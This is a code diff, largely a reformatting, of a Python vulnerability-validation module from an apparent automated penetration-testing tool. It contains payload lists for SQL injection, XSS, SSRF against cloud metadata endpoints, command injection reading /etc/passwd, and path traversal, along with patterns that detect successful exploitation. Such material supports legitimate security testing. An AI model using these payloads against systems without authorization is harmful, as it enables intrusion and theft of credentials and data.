@@ -19,21 +19,18 @@ Supported vulnerability types:
 
 from __future__ import annotations
 
-import asyncio
 import logging
 import re
-import time
 from abc import ABC, abstractmethod
 from dataclasses import dataclass
-from typing import Any, Optional
+from typing import Optional
 
 from aipt_v2.agents.shared.finding_repository import Finding, VulnerabilityType
-from aipt_v2.validation.evidence import Evidence, EvidenceCollector, EvidenceType
+from aipt_v2.validation.evidence import Evidence, EvidenceCollector
 from aipt_v2.validation.executor import (
-    ExploitExecutor,
     ExecutionContext,
     ExecutionResult,
-    SandboxConfig,
+    ExploitExecutor,
 )
 
 logger = logging.getLogger(__name__)
@@ -42,6 +39,7 @@ logger = logging.getLogger(__name__)
 @dataclass
 class ValidationAttempt:
     """Record of a validation attempt."""
+
     payload: str
     success: bool
     confidence: float
@@ -53,6 +51,7 @@ class ValidationAttempt:
 @dataclass
 class StrategyResult:
     """Result from a validation strategy."""
+
     validated: bool = False
     confidence: float = 0.0
     poc_code: str = ""
@@ -145,6 +144,7 @@ class ValidationStrategy(ABC):
         if param:
             # URL encode the payload
             import urllib.parse
+
             encoded = urllib.parse.quote(payload, safe="")
             return f"curl '{url}?{param}={encoded}'"
         else:
@@ -223,17 +223,14 @@ class SQLiValidationStrategy(ValidationStrategy):
             ("'", "Single quote - error detection"),
             ('"', "Double quote - error detection"),
             ("'--", "Comment - error detection"),
-
             # Boolean-based
             (f"{original_value}' AND '1'='1", "Boolean true condition"),
             (f"{original_value}' AND '1'='2", "Boolean false condition"),
             (f"{original_value}' OR '1'='1", "Boolean OR true"),
-
             # Time-based (MySQL)
             (f"{original_value}' AND SLEEP(5)--", "Time-based MySQL SLEEP"),
             (f"{original_value}'; WAITFOR DELAY '0:0:5'--", "Time-based MSSQL"),
             (f"{original_value}' AND pg_sleep(5)--", "Time-based PostgreSQL"),
-
             # Union-based
             (f"{original_value}' UNION SELECT NULL--", "Union NULL test"),
             (f"{original_value}' UNION SELECT 1,2,3--", "Union column count"),
@@ -258,7 +255,7 @@ class SQLiValidationStrategy(ValidationStrategy):
         )
         baseline = await self.executor.execute(baseline_ctx)
 
-        for payload, description in payloads[:self.max_attempts]:
+        for payload, description in payloads[: self.max_attempts]:
             try:
                 ctx = ExecutionContext(
                     target=finding.url or finding.target,
@@ -270,13 +267,9 @@ class SQLiValidationStrategy(ValidationStrategy):
 
                 # Check for time-based
                 if "SLEEP" in payload or "WAITFOR" in payload or "pg_sleep" in payload:
-                    is_valid, confidence = await self._validate_time_based(
-                        ctx, baseline, collector
-                    )
+                    is_valid, confidence = await self._validate_time_based(ctx, baseline, collector)
                 else:
-                    is_valid, confidence = await self._validate_error_based(
-                        ctx, collector
-                    )
+                    is_valid, confidence = await self._validate_error_based(ctx, collector)
 
                 attempt = ValidationAttempt(
                     payload=payload,
@@ -296,12 +289,14 @@ class SQLiValidationStrategy(ValidationStrategy):
 
             except Exception as e:
                 logger.warning(f"SQLi validation error with {description}: {e}")
-                result.attempts.append(ValidationAttempt(
-                    payload=payload,
-                    success=False,
-                    confidence=0,
-                    error=str(e),
-                ))
+                result.attempts.append(
+                    ValidationAttempt(
+                        payload=payload,
+                        success=False,
+                        confidence=0,
+                        error=str(e),
+                    )
+                )
 
         result.evidence = collector.get_evidence()
         return result
@@ -385,20 +380,16 @@ class XSSValidationStrategy(ValidationStrategy):
             # Basic script tags
             ("<script>alert('XSS')</script>", "Basic script tag"),
             ("'\"><script>alert('XSS')</script>", "Quote escape + script"),
-
             # Event handlers
             ("<img src=x onerror=alert('XSS')>", "IMG onerror"),
             ("<svg onload=alert('XSS')>", "SVG onload"),
             ("<body onload=alert('XSS')>", "Body onload"),
-
             # JavaScript protocol
             ("javascript:alert('XSS')", "JavaScript protocol"),
-
             # Encoded payloads
             ("<script>alert(String.fromCharCode(88,83,83))</script>", "Encoded payload"),
-
             # Attribute context
-            ("\" onmouseover=\"alert('XSS')\" x=\"", "Attribute injection"),
+            ('" onmouseover="alert(\'XSS\')" x="', "Attribute injection"),
             ("' onfocus='alert(1)' autofocus='", "Autofocus onfocus"),
         ]
 
@@ -411,7 +402,7 @@ class XSSValidationStrategy(ValidationStrategy):
         result = StrategyResult()
         payloads = self.get_payloads(finding)
 
-        for payload, description in payloads[:self.max_attempts]:
+        for payload, description in payloads[: self.max_attempts]:
             try:
                 ctx = ExecutionContext(
                     target=finding.url or finding.target,
@@ -462,12 +453,14 @@ class XSSValidationStrategy(ValidationStrategy):
 
             except Exception as e:
                 logger.warning(f"XSS validation error: {e}")
-                result.attempts.append(ValidationAttempt(
-                    payload=payload,
-                    success=False,
-                    confidence=0,
-                    error=str(e),
-                ))
+                result.attempts.append(
+                    ValidationAttempt(
+                        payload=payload,
+                        success=False,
+                        confidence=0,
+                        error=str(e),
+                    )
+                )
 
         result.evidence = collector.get_evidence()
         return result
@@ -477,8 +470,12 @@ class XSSValidationStrategy(ValidationStrategy):
         if payload in response:
             # Check if it's actually executable (not HTML encoded)
             dangerous_patterns = [
-                "<script", "onerror=", "onload=", "onfocus=",
-                "javascript:", "onmouseover=",
+                "<script",
+                "onerror=",
+                "onload=",
+                "onfocus=",
+                "javascript:",
+                "onmouseover=",
             ]
 
             for pattern in dangerous_patterns:
@@ -513,17 +510,14 @@ class SSRFValidationStrategy(ValidationStrategy):
             ("http://169.254.169.254/latest/meta-data/ami-id", "AWS AMI ID"),
             ("http://metadata.google.internal/", "GCP metadata"),
             ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata v1"),
-
             # Internal services
             ("http://localhost:22", "Local SSH"),
             ("http://127.0.0.1:80", "Local HTTP"),
             ("http://127.0.0.1:3306", "Local MySQL"),
             ("http://127.0.0.1:6379", "Local Redis"),
-
             # File protocol
             ("file:///etc/passwd", "File protocol passwd"),
             ("file:///etc/hosts", "File protocol hosts"),
-
             # DNS rebinding placeholder
             ("http://callback.aiptx.io/ssrf", "Callback server"),
         ]
@@ -545,7 +539,7 @@ class SSRFValidationStrategy(ValidationStrategy):
             "service_banner": ["SSH-2.0", "MySQL", "Redis", "HTTP/1."],
         }
 
-        for payload, description in payloads[:self.max_attempts]:
+        for payload, description in payloads[: self.max_attempts]:
             try:
                 ctx = ExecutionContext(
                     target=finding.url or finding.target,
@@ -634,11 +628,9 @@ class RCEValidationStrategy(ValidationStrategy):
             ("`id`", "Backtick id"),
             ("$(id)", "Command substitution"),
             ("; cat /etc/passwd", "Read passwd"),
-
             # Windows commands
             ("& whoami", "Windows whoami"),
             ("| whoami", "Pipe to whoami"),
-
             # Time-based
             ("; sleep 5", "Sleep command"),
             ("| sleep 5", "Pipe to sleep"),
@@ -666,14 +658,14 @@ class RCEValidationStrategy(ValidationStrategy):
 
         # Command output indicators
         rce_indicators = [
-            r"uid=\d+",           # Unix id output
-            r"gid=\d+",           # Unix id output
-            r"root:x:0:0",        # passwd file
-            r"\\[a-zA-Z]+\\",     # Windows domain\user
-            r"nt authority",      # Windows system user
+            r"uid=\d+",  # Unix id output
+            r"gid=\d+",  # Unix id output
+            r"root:x:0:0",  # passwd file
+            r"\\[a-zA-Z]+\\",  # Windows domain\user
+            r"nt authority",  # Windows system user
         ]
 
-        for payload, description in payloads[:self.max_attempts]:
+        for payload, description in payloads[: self.max_attempts]:
             try:
                 ctx = ExecutionContext(
                     target=finding.url or finding.target,
@@ -753,11 +745,9 @@ class LFIValidationStrategy(ValidationStrategy):
             ("....//....//....//etc/passwd", "Double encoding"),
             ("..%2f..%2f..%2fetc/passwd", "URL encoded"),
             ("/etc/hosts", "etc/hosts"),
-
             # Windows files
             ("..\\..\\..\\windows\\win.ini", "Windows win.ini"),
             ("C:\\windows\\win.ini", "Absolute win.ini"),
-
             # Application files
             ("../../../proc/self/environ", "Process environ"),
             ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter"),
@@ -780,7 +770,7 @@ class LFIValidationStrategy(ValidationStrategy):
             "environ": r"PATH=|HOME=",
         }
 
-        for payload, description in payloads[:self.max_attempts]:
+        for payload, description in payloads[: self.max_attempts]:
             try:
                 ctx = ExecutionContext(
                     target=finding.url or finding.target,
@@ -858,8 +848,14 @@ class AuthBypassValidationStrategy(ValidationStrategy):
 
         # Admin/protected content indicators
         protected_indicators = [
-            "admin", "dashboard", "settings", "management",
-            "configuration", "users", "delete", "create"
+            "admin",
+            "dashboard",
+            "settings",
+            "management",
+            "configuration",
+            "users",
+            "delete",
+            "create",
         ]
 
         for header, description in self.get_payloads(finding):
